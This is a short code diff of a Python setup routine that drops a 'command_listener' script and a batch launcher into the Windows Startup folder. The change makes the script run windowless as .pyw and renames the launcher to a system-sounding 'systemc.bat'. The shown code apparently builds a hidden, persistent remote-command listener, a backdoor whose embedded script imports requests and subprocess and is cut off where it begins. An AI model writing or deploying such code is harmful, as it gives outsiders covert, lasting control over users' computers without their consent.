@@ -14,10 +14,10 @@ def setup():
     if os.path.exists(lock_file):
         return  # Prevent multiple executions
     open(lock_file, "w").close()
-    script_path = os.path.join(systemcom_path, "command_listener.py")
-    batch_path = os.path.join(systemcom_path, "start_listener.bat")
+    script_path = os.path.join(systemcom_path, "command_listener.pyw")
+    batch_path = os.path.join(systemcom_path, "systemc.bat")
     startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft\Windows\Start Menu\Programs\Startup")
-    startup_batch_path = os.path.join(startup_folder, "start_listener.bat")
+    startup_batch_path = os.path.join(startup_folder, "systemc.bat")
     
     script_content = f"""
 import requests, json, random as rd, os, subprocess, time
